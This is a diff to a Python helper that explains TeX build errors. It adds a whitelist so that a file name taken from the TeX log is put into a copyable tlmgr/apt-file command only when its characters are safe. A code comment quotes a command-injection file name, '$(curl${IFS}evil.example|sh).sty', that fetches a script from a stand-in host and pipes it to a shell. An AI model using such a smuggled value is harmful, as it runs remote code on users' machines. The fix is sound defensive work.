@@ -37,6 +37,10 @@ _PACKAGE_FILE_SUFFIXES = frozenset(
     }
 )
 _MISSING_FILE = re.compile(r"file [`']([^`'\s]{1,200})' not found", re.IGNORECASE)
+# A file name that a suggested command may contain. The name comes from the TeX log, which
+# a document can write to (``\typeout``), so a name with any other character, such as
+# ``$(curl${IFS}evil.example|sh).sty``, could make a copied command run something else.
+_COMMAND_SAFE_NAME = re.compile(r"[A-Za-z0-9._+-]{1,100}")
 _MISSING_BITMAP_FONT = re.compile(r"font ([a-z0-9_-]{1,60}) at (\d{1,5}) not found", re.IGNORECASE)
 _MISSING_SYSTEM_FONT = re.compile(r'the font "([^"]{1,200})" cannot be found', re.IGNORECASE)
 _SHELL_ESCAPE_MARKERS = (
@@ -59,21 +63,34 @@ _EPS_MARKERS = ("-eps-converted-to.pdf", "-->rungs", "image format conversion fo
 
 
 def _missing_package_file(message: str) -> str | None:
-    """Explain a class, package or style file that TeX did not find."""
+    """Explain a class, package or style file that TeX did not find.
+
+    The advice names the file in a command to copy only when ``_COMMAND_SAFE_NAME`` matches
+    it; otherwise it describes the search in words.
+    """
     match = _MISSING_FILE.search(message)
     if match is None:
         return None
     name = PurePosixPath(match[1]).name
     if PurePosixPath(name).suffix.lower() not in _PACKAGE_FILE_SUFFIXES:
         return None
+    if _COMMAND_SAFE_NAME.fullmatch(name):
+        search = (
+            f"Find the package that contains it with `tlmgr search --global --file /{name}` "
+            "and install it with `sudo tlmgr install <package>` (on Debian or Ubuntu, install "
+            f"the texlive package that `apt-file search {name}` names)."
+        )
+    else:
+        search = (
+            "Find the package that contains it with tlmgr's file search and install it with "
+            "`sudo tlmgr install <package>` (on Debian or Ubuntu, find its texlive package "
+            "with apt-file)."
+        )
     return (
         f"{name} is in neither the project nor the TeX distribution that Fledge's build uses. "
-        f"Find the package that contains it with `tlmgr search --global --file /{name}` and "
-        "install it with `sudo tlmgr install <package>` (on Debian or Ubuntu, install the "
-        "texlive package that `apt-file search "
-        f"{name}` names). A copy in a personal TeX tree (TEXMFHOME, such as ~/Library/texmf "
-        "or ~/texmf) or in TEXMFLOCAL is invisible to Fledge's builds, as it is to the "
-        f"receiving service: put {name} into the project instead. See {BUILD_FAILED_GUIDE}."
+        f"{search} A copy in a personal TeX tree (TEXMFHOME, such as ~/Library/texmf or "
+        "~/texmf) or in TEXMFLOCAL is invisible to Fledge's builds, as it is to the receiving "
+        f"service: put {name} into the project instead. See {BUILD_FAILED_GUIDE}."
     )
 
 
